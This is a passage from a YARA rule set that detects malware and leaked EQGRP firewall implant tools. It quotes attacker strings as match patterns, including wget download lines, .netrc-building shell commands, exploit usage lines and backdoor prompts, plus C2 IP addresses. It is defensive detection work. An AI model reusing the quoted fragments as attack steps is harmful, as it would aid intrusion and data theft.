$b = {68 ?? ?? ?? ?? FF 15 ?? ?? ?? 00 E9 62 FF FF FF E8 69 10 FE FF 5F 5E 5B C9 C3}
// API String identifier (ShellExecuteExW, SHELL32.dll, GetUserNameExW, Secur32.dll)
$c = {53 68 65 6C 6C 45 78 65 63 75 74 65 45 78 57 00 53 48 45 4C 4C 33 32 2E 64 6C 6C 00 1E 00 47 65}
$d = {74 55 73 65 72 4E 61 6D 65 45 78 57 00 00 53 65 63 75 72 33 32 2E 64 6C 6C 00 10 00}
// New Thread identifier
$e = {55 8B EC 83 E4 F8 83 EC 1C 83 7D 08 00 57 74 ?? 6A FF FF 75 08 FF 15 ?? ?? ?? 00}
condition:
all of them and filesize < 300KB // Standard size (raw from builder) should be arround ~264kb
// Remove the above line if you want to trig also on memory dumps, etc...
}
rule SSC_Atmos_Malware
{
meta:
description = "Generic Spyware.Citadel.Atmos Signature"
author = "xylitol@temari.fr"
reference = "http://www.xylibox.com/2016/02/citadel-0011-atmos.html"
date = "20/08/2016"
// May only the challenge guide you
strings:
// Check for the presence of MZ and kutuzov license identifier
$MZ = {4D 5A}
$LKEY = "533D9226E4C1CE0A9815DBEB19235AE4" wide ascii
// TokenSpy identifiers
$TS1 = "X-TS-Rule-Name: %s" wide ascii
$TS2 = "X-TS-Rule-PatternID: %u" wide ascii
$TS3 = "X-TS-BotID: %s" wide ascii
$TS4 = "X-TS-Domain: %s" wide ascii
$TS5 = "X-TS-SessionID: %s" wide ascii
$TS6 = "X-TS-Header-Cookie: %S" wide ascii
$TS7 = "X-TS-Header-Referer: %S" wide ascii
$TS8 = "X-TS-Header-AcceptEncoding: %S" wide ascii
$TS9 = "X-TS-Header-AcceptLanguage: %S" wide ascii
$TS10 = "X-TS-Header-UserAgent: %S" wide ascii
// Hidden VNC identifiers
$VNC1 = "_hvnc_init@4" wide ascii
$VNC2 = "_hvnc_uninit@0" wide ascii
$VNC3 = "_hvnc_start@8" wide ascii
$VNC4 = "_hvnc_stop@0" wide ascii
$VNC5 = "_hvnc_wait@0" wide ascii
$VNC6 = "_hvnc_work@0" wide ascii
// Browsers identifiers
$WB1 = "nspr4.dll" wide ascii
$WB2 = "nss3.dll" wide ascii
$WB3 = "chrome.dll" wide ascii
$WB4 = "Internet Explorer" wide ascii
$WB5 = "Firefox" wide ascii
$WB6 = "Chrome" wide ascii
condition:
($MZ at 0 and $LKEY) and ( (5 of ($TS*) and all of ($WB*)) or (3 of ($VNC*) and all of ($WB*)))
and filesize < 300KB // Standard size (raw from builder) should be arround ~264kb
// Remove the above line if you want to trig also on memory dumps, etc...
}
rule SSC_Atmos_Builder
{
meta:
description = "Generic signature for Hacktool.Atmos.Builder cracked version"
author = "xylitol@temari.fr"
reference = "http://www.xylibox.com/2016/02/citadel-0011-atmos.html"
date = "20/08/2016"
// May only the challenge guide you
strings:
// Check for the presence of MZ, kutuzov license identifier, and good hardware ID
$MZ = {4D 5A}
$LKEY = "533D9226E4C1CE0A9815DBEB19235AE4" wide ascii
$HWID = "D19FC0FB14BE23BCF35DA427951BB5AE" wide ascii
// Builder strings identifiers
$s1 = "url_loader=%S" wide ascii
$s2 = "url_webinjects=%S" wide ascii
$s3 = "url_tokenspy=%S" wide ascii
$s4 = "file_webinjects=%S" wide ascii
$s5 = "moneyparser.enabled=%u" wide ascii
$s6 = "enable_luhn10_post=%u" wide ascii
$s7 = "insidevm_enable=%u" wide ascii
$s8 = "disable_antivirus=%u" wide ascii
condition:
$MZ at 0 and $LKEY and $HWID and all of ($s*)
}
rule SSC_citadel13xy
{
meta:
author = "Jean-Philippe Teissier / @Jipe_"
description = "Citadel 1.5.x.y trojan banker"
date = "2013-01-12"
version = "1.0"
filetype = "memory"
strings:
$a = "Coded by BRIAN KREBS for personnal use only. I love my job & wife."
$b = "http://%02x%02x%02x%02x%02x%02x%02x%02x.com/%02x%02x%02x%02x/%02x%02x%02x%02x%02x.php"
$c = "%BOTID%"
$d = "%BOTNET%"
$e = "cit_video.module"
$f = "bc_remove"
$g = "bc_add"
$ggurl = "http://www.google.com/webhp"
condition:
3 of them
}
rule SSC_Citadel_Malware
{
meta:
author = "xylitol@temari.fr"
date = "2015-10-08"
description = "Search for nss3.dll pattern indicating an hexed copy of Citadel malware to work on firefox > v23.0"
// May only the challenge guide you
strings:
$s1 = "Coded by BRIAN KREBS for personal use only. I love my job & wife" wide ascii
$s2 = "nss3.dll" wide ascii
$h1 = {8B C7 EB F5 55 8B EC}
$h2 = {55 8B EC 83 EC 0C 8A 82 00 01 00 00}
$h3 = {3D D0 FF 1F 03 77 ?? 83 7D}
$h4 = {83 F9 66 74 ?? 83 F9 6E 74 ?? 83 F9 76 74 ?? 83 F9 7A}
condition:
all of ($s*) and 2 of ($h*)
}
rule SSC_ChickenDOS_Linux
{
meta:
author = "Jason Jones <jasonjones@arbor.net>"
description = "Linux-variant of Chicken ident for both dropper and dropped file"
source = "https://github.com/arbor/yara/blob/master/chicken.yara"
strings:
$cfg = "fake.cfg"
$file1 = "ThreadAttack.cpp"
$file2 = "Fake.cpp"
$str1 = "dns_array"
$str2 = "DomainRandEx"
$str3 = "cpu %llu %llu %llu %llu"
$str4 = "[ %02d.%02d %02d:%02d:%02d.%03ld ] [%lu] [%s] %s" ascii
condition:
$cfg and all of ($file*) and 3 of ($str*)
}
rule SSC_ChickenDOS
{
meta:
author = "Jason Jones <jasonjones@arbor.net>"
description = "Win32-variant of Chicken ident for both dropper and dropped file"
source = "https://github.com/arbor/yara/blob/master/chicken.yara"
strings:
$pdb1 = "\\Chicken\\Release\\svchost.pdb"
$pdb2 = "\\IntergrateCHK\\Release\\IntergrateCHK.pdb"
$str2 = "fake.cf"
$str3 = "8.8.8.8"
$str4 = "Processor(%d)\\"
$str5 = "DbProtectSupport"
$str1 = "dm1712/`jvpnpkte/bpl"
$str6 = "InstallService NPF %d"
$str7 = "68961"
$str8 = "InstallService DbProtectSupport %d"
$str9 = "C:\\Program Files\\DbProtectSupport\\npf.sys"
condition:
($pdb1 or $pdb2) and 5 of ($str*)
}
rule SSC_Win32_Buzus_Softpulse
{
meta:
description = "Trojan Buzus / Softpulse"
author = "Florian Roth"
date = "2015-05-13"
hash = "2f6df200e63a86768471399a74180466d2e99ea9"
score = 75
strings:
$x1 = "pi4izd6vp0.com" fullword ascii
$s1 = "SELECT * FROM Win32_Process" fullword wide
$s4 = "CurrentVersion\\Uninstall\\avast" fullword wide
$s5 = "Find_RepeatProcess" fullword ascii
$s6 = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\" fullword wide
$s7 = "myapp.exe" fullword ascii
$s14 = "/c ping -n 1 www.google" wide
condition:
uint16(0) == 0x5a4d and ( ( $x1 and 2 of ($s*) ) or all of ($s*) )
}
rule SSC_Bublik
{
meta:
author="Kevin Falcoz"
date="29/09/2013"
description="Bublik Trojan Downloader"
strings:
$signature1={63 6F 6E 73 6F 6C 61 73}
$signature2={63 6C 55 6E 00 69 6E 66 6F 2E 69 6E 69}
condition:
$signature1 and $signature2
}
rule SSC_BoousetCode
{
meta:
description = "Boouset code tricks"
author = "Seth Hardy"
last_modified = "2014-06-19"
strings:
$boousetdat = { C6 ?? ?? ?? ?? 00 62 C6 ?? ?? ?? ?? 00 6F C6 ?? ?? ?? ?? 00 6F C6 ?? ?? ?? ?? 00 75 }
condition:
any of them
}
rule SSC_BlackWorm
{
meta:
author = "Brian Wallace @botnet_hunter"
author_email = "bwall@ballastsecurity.net"
date = "2015-05-20"
description = "Identify BlackWorm"
strings:
$str1 = "m_ComputerObjectProvider"
$str2 = "MyWebServices"
$str3 = "get_ExecutablePath"
$str4 = "get_WebServices"
$str5 = "My.WebServices"
$str6 = "My.User"
$str7 = "m_UserObjectProvider"
$str8 = "DelegateCallback"
$str9 = "TargetMethod"
$str10 = "000004b0" wide
$str11 = "Microsoft Corporation" wide
condition:
all of them
}
rule SSC_blackrev
{
strings:
$base1 = "http"
$base2 = "simple"
$base3 = "loginpost"
$base4 = "datapost"
$opt1 = "blackrev"
$opt2 = "stop"
$opt3 = "die"
$opt4 = "sleep"
$opt5 = "syn"
$opt6 = "udp"
$opt7 = "udpdata"
$opt8 = "icmp"
$opt9 = "antiddos"
$opt10 = "range"
$opt11 = "fastddos"
$opt12 = "slowhttp"
$opt13 = "allhttp"
$opt14 = "tcpdata"
$opt15 = "dataget"
condition:
all of ($base*) and 5 of ($opt*)
}
rule SSC_backoff
{
meta:
author = "Brian Wallace @botnet_hunter"
author_email = "bwall@ballastsecurity.net"
date = "2014-08-21"
description = "Identify Backoff"
strings:
$s1 = "&op=%d&id=%s&ui=%s&wv=%d&gr=%s&bv=%s"
$s2 = "%s @ %s"
$s3 = "Upload KeyLogs"
condition:
all of them
}
rule SSC_custom_ssh_backdoor_server
{
meta:
description = "Custome SSH backdoor based on python and paramiko - file server.py"
author = "Florian Roth"
reference = "https://goo.gl/S46L3o"
date = "2015-05-14"
hash = "0953b6c2181249b94282ca5736471f85d80d41c9"
strings:
$s0 = "command= raw_input(\"Enter command: \").strip('n')" fullword ascii
$s1 = "print '[-] (Failed to load moduli -- gex will be unsupported.)'" fullword ascii
$s2 = "print '[-] Listen/bind/accept failed: ' + str(e)" fullword ascii
$s3 = "chan.send(command)" fullword ascii
$s4 = "print '[-] SSH negotiation failed.'" fullword ascii
$s5 = "except paramiko.SSHException, x:" fullword ascii
condition:
filesize < 10KB and 5 of them
}
rule SSC_andromeda
{
meta:
author = "Brian Wallace @botnet_hunter"
author_email = "bwall@ballastsecurity.net"
date = "2014-03-13"
description = "Identify Andromeda"
strings:
$config = {1c 1c 1d 03 49 47 46}
$c1 = "hsk\\ehs\\dihviceh\\serhlsethntrohntcohurrehem\\chsyst"
condition:
all of them
}
rule SSC_Worm_Gamarue
{
meta:
author = "Centro Criptolgico Nacional (CCN)"
ref = "https://www.ccn-cert.cni.es/informes/informes-ccn-cert-publicos.html"
description = "Gamarue_Andromeda"
strings:
$a = { 69 E1 2A B0 2D 80 44 E3 2D 80 44 E3 2D 80 44 E3 EE 8F 1B E3 2A 80 44 E3 EE 8F 19 E3 3A 80 44 E3 2D 80 45 E3 CD 81 44 E3 0A 46 39 E3 34 80 44 E3 0A 46 29 E3 A5 80 44 E3 0A 46 2A E3 5C 80 44 E3 0A 46 36 E3 2C 80 44 E3 0A 46 3C E3 2C 80 44 E3 }
condition:
$a
}
rule SSC_andromeda_bot
{
meta:
maltype = "Andromeda bot"
author = "https://github.com/reed1713"
description = "IOC looks for the creation or termination of a process associated with the Andromeda Trojan. The malware will execute the msiexec.exe within the suspicious directory. Shortly after, it creates and injects itself into the wuauctl.exe (windows update) process. It then attempts to beacon to its C2."
strings:
$type="Microsoft-Windows-Security-Auditing"
$eventid="4688"
$data="AppData\\Local\\Temp\\_.net_\\msiexec.exe"
condition:
all of them
}
rule SSC_alina
{
meta:
author = "Brian Wallace @botnet_hunter"
author_email = "bwall@ballastsecurity.net"
date = "2014-08-09"
description = "Identify Alina"
strings:
$s1 = "Alina v1.0"
$s2 = "POST"
$s3 = "1[0-2])[0-9]"
condition:
all of them
}
rule SSC_BeEF_browser_hooked
{
meta:
description = "Yara rule related to hook.js, BeEF Browser hooking capability"
author = "Pasquale Stirparo"
date = "2015-10-07"
hash1 = "587e611f49baf63097ad2421ad0299b7b8403169ec22456fb6286abf051228db"
strings:
$s0 = "mitb.poisonAnchor" wide ascii
$s1 = "this.request(this.httpproto" wide ascii
$s2 = "beef.logger.get_dom_identifier" wide ascii
$s3 = "return (!!window.opera" wide ascii
$s4 = "history.pushState({ Be:\"EF\" }" wide ascii
$s5 = "window.navigator.userAgent.match(/Opera\\/9\\.80.*Version\\/10\\./)" wide ascii
$s6 = "window.navigator.userAgent.match(/Opera\\/9\\.80.*Version\\/11\\./)" wide ascii
$s7 = "window.navigator.userAgent.match(/Avant TriCore/)" wide ascii
$s8 = "window.navigator.userAgent.match(/Iceweasel" wide ascii
$s9 = "mitb.sniff(" wide ascii
$s10 = "Method XMLHttpRequest.open override" wide ascii
$s11 = ".browser.hasWebSocket" wide ascii
$s12 = ".mitb.poisonForm" wide ascii
$s13 = "resolved=require.resolve(file,cwd||" wide ascii
$s14 = "if (document.domain == domain.replace(/(\\r\\n|\\n|\\r)/gm" wide ascii
$s15 = "beef.net.request" wide ascii
$s16 = "uagent.search(engineOpera)" wide ascii
$s17 = "mitb.sniff" wide ascii
$s18 = "beef.logger.start" wide ascii
condition:
all of them
}
rule SSC_COZY_FANCY_BEAR_pagemgr_Hunt
{
meta:
description = "Detects a pagemgr.exe as mentioned in the CrowdStrike report"
author = "Florian Roth"
reference = "https://www.crowdstrike.com/blog/bears-midst-intrusion-democratic-national-committee/"
date = "2016-06-14"
strings:
$s1 = "pagemgr.exe" wide fullword
condition:
uint16(0) == 0x5a4d and 1 of them
}
rule SSC_COZY_FANCY_BEAR_Hunt
{
meta:
description = "Detects Cozy Bear / Fancy Bear C2 Server IPs"
author = "Florian Roth"
reference = "https://www.crowdstrike.com/blog/bears-midst-intrusion-democratic-national-committee/"
date = "2016-06-14"
strings:
$s1 = "185.100.84.134" ascii wide fullword
$s2 = "58.49.58.58" ascii wide fullword
$s3 = "218.1.98.203" ascii wide fullword
$s4 = "187.33.33.8" ascii wide fullword
$s5 = "185.86.148.227" ascii wide fullword
$s6 = "45.32.129.185" ascii wide fullword
$s7 = "23.227.196.217" ascii wide fullword
condition:
uint16(0) == 0x5a4d and 1 of them
}
rule SSC_EQGRP_create_http_injection
{
meta:
description = "EQGRP Toolset Firewall - file create_http_injection.py"
author = "Florian Roth"
reference = "Research"
date = "2016-08-16"
hash1 = "de52f5621b4f3896d4bd1fb93ee8be827e71a2b189a9f8552b68baed062a992d"
strings:
$x1 = "required by SECONDDATE" fullword ascii
$s1 = "help='Output file name (optional). By default the resulting data is written to stdout.')" fullword ascii
$s2 = "data = '<html><body onload=\"location.reload(true)\"><iframe src=\"%s\" height=\"1\" width=\"1\" scrolling=\"no\" frameborder=\"" ascii
$s3 = "version='%prog 1.0'," fullword ascii
$s4 = "usage='%prog [ ... options ... ] url'," fullword ascii
condition:
( uint16(0) == 0x2123 and filesize < 3KB and ( $x1 or 2 of them ) ) or ( all of them )
}
rule SSC_EQGRP_false
{
meta:
description = "Detects tool from EQGRP toolset - file false.exe"
author = "Florian Roth"
reference = "Research"
date = "2016-08-15"
strings:
$s1 = { 00 25 64 2E 0A 00 00 00 00 25 64 2E 0A 00 00 00
00 25 6C 75 2E 25 6C 75 2E 25 6C 75 2E 25 6C 75
00 25 64 2E 0A 00 00 00 00 25 64 2E 0A 00 00 00
00 25 64 2E 0A 00 00 00 00 25 64 2E 0A 00 00 00
00 25 32 2E 32 58 20 00 00 0A 00 00 00 25 64 20
2D 20 25 64 20 25 64 0A 00 25 64 0A 00 25 64 2E
0A 00 00 00 00 25 64 2E 0A 00 00 00 00 25 64 2E
0A 00 00 00 00 25 64 20 2D 20 25 64 0A 00 00 00
00 25 64 20 2D 20 25 64 }
condition:
uint16(0) == 0x5a4d and filesize < 50KB and $s1
}
rule SSC_install_get_persistent_filenames
{
meta:
description = "EQGRP Toolset Firewall - file install_get_persistent_filenames"
author = "Florian Roth"
reference = "Research"
date = "2016-08-16"
hash1 = "4a50ec4bf42087e932e9e67e0ea4c09e52a475d351981bb4c9851fda02b35291"
strings:
$s1 = "Generates the persistence file name and prints it out." fullword ascii
condition:
( uint16(0) == 0x457f and all of them )
}
rule SSC_EQGRP_noclient_3_0_5
{
meta:
description = "Detects tool from EQGRP toolset - file noclient-3.0.5.3"
author = "Florian Roth"
reference = "Research"
date = "2016-08-15"
strings:
$x1 = "-C %s 127.0.0.1\" scripme -F -t JACKPOPIN4 '&" fullword ascii
$x2 = "Command too long!  What the HELL are you trying to do to me?!?!  Try one smaller than %d bozo." fullword ascii
$x3 = "sh -c \"ping -c 2 %s; grep %s /proc/net/arp >/tmp/gx \"" fullword ascii
$x4 = "Error from ourtn, did not find keys=target in tn.spayed" fullword ascii
$x5 = "ourtn -d -D %s -W 127.0.0.1:%d  -i %s -p %d %s %s" fullword ascii
condition:
( uint16(0) == 0x457f and filesize < 700KB and 1 of them ) or ( all of them )
}
rule SSC_EQGRP_SecondDate_2211
{
meta:
description = "EQGRP Toolset Firewall - file SecondDate-2211.exe"
author = "Florian Roth"
reference = "Research"
date = "2016-08-16"
hash1 = "2337d0c81474d03a02c404cada699cf1b86c3c248ea808d4045b86305daa2607"
strings:
$s1 = "SD_processControlPacket" fullword ascii
$s2 = "Encryption_rc4SetKey" fullword ascii
$s3 = ".got_loader" fullword ascii
$s4 = "^GET.*(?:/ |\\.(?:htm|asp|php)).*\\r\\n" fullword ascii
condition:
( uint16(0) == 0x457f and filesize < 200KB and all of them )
}
rule SSC_EQGRP_teflonhandle
{
meta:
description = "Detects tool from EQGRP toolset - file teflonhandle.exe"
author = "Florian Roth"
reference = "Research"
date = "2016-08-15"
strings:
$s1 = "%s [infile] [outfile] /k 0x[%i character hex key] </g>" fullword ascii
$s2 = "File %s already exists.  Overwrite? (y/n) " fullword ascii
$s3 = "Random Key : 0x" fullword ascii
$s4 = "done (%i bytes written)." fullword ascii
$s5 = "%s --> %s..." fullword ascii
condition:
uint16(0) == 0x5a4d and filesize < 20KB and 2 of them
}
rule SSC_EQGRP_BARPUNCH_BPICKER
{
meta:
description = "EQGRP Toolset Firewall - from files BARPUNCH-3110, BPICKER-3100"
author = "Florian Roth"
reference = "Research"
date = "2016-08-16"
super_rule = 1
hash1 = "830538fe8c981ca386c6c7d55635ac61161b23e6e25d96280ac2fc638c2d82cc"
hash2 = "d859ce034751cac960825268a157ced7c7001d553b03aec54e6794ff66185e6f"
strings:
$x1 = "--cmd %x --idkey %s --sport %i --dport %i --lp %s --implant %s --bsize %hu --logdir %s --lptimeout %u" fullword ascii
$x2 = "%s -c <cmdtype> -l <lp> -i <implant> -k <ikey> -s <port> -d <port> [operation] [options]" fullword ascii
$x3 = "* [%lu] 0x%x is marked as stateless (the module will be persisted without its configuration)" fullword ascii
$x4 = "%s version %s already has persistence installed. If you want to uninstall," fullword ascii
$x5 = "The active module(s) on the target are not meant to be persisted" fullword ascii
condition:
( uint16(0) == 0x457f and filesize < 6000KB and 1 of them ) or ( 3 of them )
}
rule SSC_EQGRP_config_jp1_UA
{
meta:
description = "EQGRP Toolset Firewall - file config_jp1_UA.pl"
author = "Florian Roth"
reference = "Research"
date = "2016-08-16"
hash1 = "2f50b6e9891e4d7fd24cc467e7f5cfe348f56f6248929fec4bbee42a5001ae56"
strings:
$x1 = "This program will configure a JETPLOW Userarea file." fullword ascii
$x2 = "Error running config_implant." fullword ascii
$x3 = "NOTE:  IT ASSUMES YOU ARE OPERATING IN THE INSTALL/LP/JP DIRECTORY. THIS ASSUMPTION " fullword ascii
$x4 = "First IP address for beacon destination [127.0.0.1]" fullword ascii
condition:
1 of them
}
rule SSC_EQGRP_tinyhttp_setup
{
meta:
description = "EQGRP Toolset Firewall - file tinyhttp_setup.sh"
author = "Florian Roth"
reference = "Research"
date = "2016-08-16"
hash1 = "3d12c83067a9f40f2f5558d3cf3434bbc9a4c3bb9d66d0e3c0b09b9841c766a0"
strings:
$x1 = "firefox http://127.0.0.1:8000/$_name" fullword ascii
$x2 = "What is the name of your implant:" fullword ascii /* it's called conscience */
$x3 = "killall thttpd" fullword ascii
$x4 = "copy http://<IP>:80/$_name flash:/$_name" fullword ascii
condition:
( uint16(0) == 0x2123 and filesize < 2KB and 1 of ($x*) ) or ( all of them )
}
rule SSC_EQGRP_1212_dehex
{
meta:
description = "Detects tool from EQGRP toolset - from files 1212.pl, dehex.pl"
author = "Florian Roth"
reference = "Research"
date = "2016-08-15"
strings:
$s1 = "return \"ERROR:$line is not a valid address\";" fullword ascii
$s2 = "print \"ERROR: the filename or hex representation needs to be one argument try using \\\"'s\\n\";" fullword ascii
$s3 = "push(@octets,$byte_table{$tempi});" fullword ascii
$s4 = "$byte_table{\"$chars[$sixteens]$chars[$ones]\"}=$i;" fullword ascii
$s5 = "print hextoIP($ARGV[0]);" fullword ascii
condition:
( uint16(0) == 0x2123 and filesize < 6KB and ( 5 of ($s*) ) ) or ( all of them )
}
rule SSC_EQGRP_MixText
{
meta:
description = "EQGRP Toolset Firewall - file MixText.py"
author = "Florian Roth"
reference = "Research"
date = "2016-08-16"
hash1 = "e4d24e30e6cc3a0aa0032dbbd2b68c60bac216bef524eaf56296430aa05b3795"
strings:
$s1 = "BinStore enabled implants." fullword ascii
condition:
1 of them
}
rule SSC_EQGRP_extrabacon
{
meta:
description = "EQGRP Toolset Firewall - file extrabacon_1.1.0.1.py"
author = "Florian Roth"
reference = "Research"
date = "2016-08-16"
hash1 = "59d60835fe200515ece36a6e87e642ee8059a40cb04ba5f4b9cce7374a3e7735"
strings:
$x1 = "To disable password checking on target:" fullword ascii
$x2 = "[-] target is running" fullword ascii
$x3 = "[-] problem importing version-specific shellcode from" fullword ascii
$x4 = "[+] importing version-specific shellcode" fullword ascii
$s5 = "[-] unsupported target version, abort" fullword ascii
condition:
1 of them
}
rule SSC_EQGRP_bc_parser
{
meta:
description = "Detects tool from EQGRP toolset - file bc-parser"
author = "Florian Roth"
reference = "Research"
date = "2016-08-15"
hash1 = "879f2f1ae5d18a3a5310aeeafec22484607649644e5ecb7d8a72f0877ac19cee"
strings:
$s1 = "*** Target may be susceptible to FALSEMOREL      ***" fullword ascii
$s2 = "*** Target is susceptible to FALSEMOREL          ***" fullword ascii
condition:
uint16(0) == 0x457f and 1 of them
}
rule SSC_EQGRP_morel
{
meta:
description = "Detects tool from EQGRP toolset - file morel.exe"
author = "Florian Roth"
reference = "Research"
date = "2016-08-15"
hash1 = "a9152e67f507c9a179bb8478b58e5c71c444a5a39ae3082e04820a0613cd6d9f"
strings:
$s1 = "%d - %d, %d" fullword ascii
$s2 = "%d - %lu.%lu %d.%lu" fullword ascii
$s3 = "%d - %d %d" fullword ascii
condition:
( uint16(0) == 0x5a4d and filesize < 60KB and all of them )
}
rule SSC_EQGRP_BBALL_M50FW08_2201
{
meta:
description = "EQGRP Toolset Firewall - file BBALL_M50FW08-2201.exe"
author = "Florian Roth"
reference = "Research"
date = "2016-08-16"
hash1 = "80c0b68adb12bf3c15eff9db70a57ab999aad015da99c4417fdfd28156d8d3f7"
strings:
$s1 = ".got_loader" fullword ascii
$s2 = "LOADED" fullword ascii
$s3 = "pageTable.c" fullword ascii
$s4 = "_start_text" fullword ascii
$s5 = "handler_readBIOS" fullword ascii
$s6 = "KEEPGOING" fullword ascii
condition:
( uint16(0) == 0x457f and filesize < 40KB and 5 of ($s*) )
}
rule SSC_EQGRP_payload
{
meta:
description = "EQGRP Toolset Firewall - file payload.py"
author = "Florian Roth"
reference = "Research"
date = "2016-08-16"
hash1 = "21bed6d699b1fbde74cbcec93575c9694d5bea832cd191f59eb3e4140e5c5e07"
strings:
$s1 = "can't find target version module!" fullword ascii
$s2 = "class Payload:" fullword ascii
condition:
all of them
}
rule SSC_EQGRP_BpfCreator_RHEL4
{
meta:
description = "EQGRP Toolset Firewall - file BpfCreator-RHEL4"
author = "Florian Roth"
reference = "Research"
date = "2016-08-16"
hash1 = "bd7303393409623cabf0fcf2127a0b81fae52fe40a0d2b8db0f9f092902bbd92"
strings:
$s1 = "usage %s \"<tcpdump pcap string>\" <outfile>" fullword ascii
$s2 = "error reading dump file: %s" fullword ascii
$s3 = "truncated dump file; tried to read %u captured bytes, only got %lu" fullword ascii
$s4 = "%s: link-layer type %d isn't supported in savefiles" fullword ascii
$s5 = "DLT %d is not one of the DLTs supported by this device" fullword ascii
condition:
( uint16(0) == 0x457f and filesize < 2000KB and all of them )
}
rule SSC_EQGRP_epicbanana_2_1_0_1
{
meta:
description = "EQGRP Toolset Firewall - file epicbanana_2.1.0.1.py"
author = "Florian Roth"
reference = "Research"
date = "2016-08-16"
hash1 = "4b13cc183c3aaa8af43ef3721e254b54296c8089a0cd545ee3b867419bb66f61"
strings:
$s1 = "failed to create version-specific payload" fullword ascii
$s2 = "(are you sure you did \"make [version]\" in versions?)" fullword ascii
condition:
1 of them
}
rule SSC_EQGRP_BUSURPER_2211_724
{
meta:
description = "EQGRP Toolset Firewall - file BUSURPER-2211-724.exe"
author = "Florian Roth"
reference = "Research"
date = "2016-08-16"
hash1 = "d809d6ff23a9eee53d2132d2c13a9ac5d0cb3037c60e229373fc59a4f14bc744"
strings:
$s1 = ".got_loader" fullword ascii
$s2 = "_start_text" fullword ascii
$s3 = "IMPLANT" fullword ascii
$s4 = "KEEPGOING" fullword ascii
$s5 = "upgrade_implant" fullword ascii
condition:
all of them
}
rule SSC_EQGRP_BBALL
{
meta:
description = "EQGRP Toolset Firewall - file BBALL_E28F6-2201.exe"
author = "Florian Roth"
reference = "Research"
date = "2016-08-16"
hash1 = "498fc9f20b938b8111adfa3ca215325f265a08092eefd5300c4168876deb7bf6"
strings:
$s1 = "Components/Modules/BiosModule/Implant/E28F6/../e28f640j3_asm.S" fullword ascii
$s2 = ".got_loader" fullword ascii
$s3 = "handler_readBIOS" fullword ascii
$s4 = "cmosReadByte" fullword ascii
$s5 = "KEEPGOING" fullword ascii
$s6 = "checksumAreaConfirmed.0" fullword ascii
$s7 = "writeSpeedPlow.c" fullword ascii
condition:
( uint16(0) == 0x457f and filesize < 40KB and 4 of ($s*) ) or ( all of them )
}
rule SSC_EQGRP_BBANJO
{
meta:
description = "EQGRP Toolset Firewall - file BBANJO-3011.exe"
author = "Florian Roth"
reference = "Research"
date = "2016-08-16"
hash1 = "f09c2f90464781a08436321f6549d350ecef3d92b4f25b95518760f5d4c9b2c3"
strings:
$s1 = "get_lsl_interfaces" fullword ascii
$s2 = "encryptFC4Payload" fullword ascii
$s3 = ".got_loader" fullword ascii
$s4 = "beacon_getconfig" fullword ascii
$s5 = "LOADED" fullword ascii
$s6 = "FormBeaconPacket" fullword ascii
$s7 = "beacon_reconfigure" fullword ascii
condition:
( uint16(0) == 0x457f and filesize < 50KB and all of them )
}
rule SSC_EQGRP_workit
{
meta:
description = "EQGRP Toolset Firewall - file workit.py"
author = "Florian Roth"
reference = "Research"
date = "2016-08-16"
hash1 = "fb533b4d255b4e6072a4fa2e1794e38a165f9aa66033340c2f4f8fd1da155fac"
strings:
$s1 = "macdef init > /tmp/.netrc;" fullword ascii
$s2 = "/usr/bin/wget http://" fullword ascii
$s3 = "HOME=/tmp ftp" fullword ascii
$s4 = " >> /tmp/.netrc;" fullword ascii
$s5 = "/usr/rapidstream/bin/tftp" fullword ascii
$s6 = "created shell_command:" fullword ascii
$s7 = "rm -f /tmp/.netrc;" fullword ascii
$s8 = "echo quit >> /tmp/.netrc;" fullword ascii
$s9 = "echo binary >> /tmp/.netrc;" fullword ascii
$s10 = "chmod 600 /tmp/.netrc;" fullword ascii
$s11 = "created cli_command:" fullword ascii
condition:
6 of them
}
rule SSC_EQGRP_EPBA
{
meta:
description = "EQGRP Toolset Firewall - file EPBA.script"
author = "Florian Roth"
reference = "Research"
date = "2016-08-16"
hash1 = "53e1af1b410ace0934c152b5df717d8a5a8f5fdd8b9eb329a44d94c39b066ff7"
strings:
$x1 = "./epicbanana_2.0.0.1.py -t 127.0.0.1 --proto=ssh --username=cisco --password=cisco --target_vers=asa804 --mem=NA -p 22 " fullword ascii
$x2 = "-t TARGET_IP, --target_ip=TARGET_IP -- Either 127.0.0.1 or Win Ops IP" fullword ascii
$x3 = "./bride-1100 --lp 127.0.0.1 --implant 127.0.0.1 --sport RHP --dport RHP" fullword ascii
$x4 = "--target_vers=TARGET_VERS    target Pix version (pix712, asa804) (REQUIRED)" fullword ascii
$x5 = "-p DEST_PORT, --dest_port=DEST_PORT defaults: telnet=23, ssh=22 (optional) - Change to LOCAL redirect port" fullword ascii
$x6 = "this operation is complete, BananaGlee will" fullword ascii
$x7 = "cd /current/bin/FW/BGXXXX/Install/LP" fullword ascii
condition:
( uint16(0) == 0x2023 and filesize < 7KB and 1 of ($x*) ) or ( 3 of them )
}
rule SSC_EQGRP_BLIAR_BLIQUER
{
meta:
description = "EQGRP Toolset Firewall - from files BLIAR-2110, BLIQUER-2230"
author = "Florian Roth"
reference = "Research"
date = "2016-08-16"
super_rule = 1
hash1 = "05031898f3d52a5e05de119868c0ec7caad3c9f3e9780e12f6f28b02941895a4"
hash2 = "d9756e3ba272cd4502d88f4520747e9e69d241dee6561f30423840123c1a7939"
strings:
$x1 = "Do you wish to activate the implant that is already on the firewall? (y/n): " fullword ascii
$x2 = "There is no implant present on the firewall." fullword ascii
$x3 = "Implant Version :%lx%lx%lx" fullword ascii
$x4 = "You may now connect to the implant using the pbd idkey" fullword ascii
$x5 = "No reply from persistant back door." fullword ascii
$x6 = "rm -rf pbd.wc; wc -c %s > pbd.wc" fullword ascii
$p1 = "PBD_GetVersion" fullword ascii
$p2 = "pbd/pbdEncrypt.bin" fullword ascii
$p3 = "pbd/pbdGetVersion.pkt" fullword ascii
$p4 = "pbd/pbdStartWrite.bin" fullword ascii
$p5 = "pbd/pbd_setNewHookPt.pkt" fullword ascii
$p6 = "pbd/pbd_Upload_SinglePkt.pkt" fullword ascii
$s1 = "Unable to fetch hook and jmp addresses for this OS version" fullword ascii
$s2 = "Could not get hook and jump addresses" fullword ascii
$s3 = "Enter the name of a clean implant binary (NOT an image):" fullword ascii
$s4 = "Unable to read dat file for OS version 0x%08lx" fullword ascii
$s5 = "Invalid implant file" fullword ascii
condition:
( uint16(0) == 0x457f and filesize < 3000KB and ( 1 of ($x*) or 1 of ($p*) ) ) or ( 3 of them )
}
rule SSC_EQGRP_eligiblebombshell_generic
{
meta:
description = "EQGRP Toolset Firewall - from files eligiblebombshell_1.2.0.1.py, eligiblebombshell_1.2.0.1.py"
author = "Florian Roth"
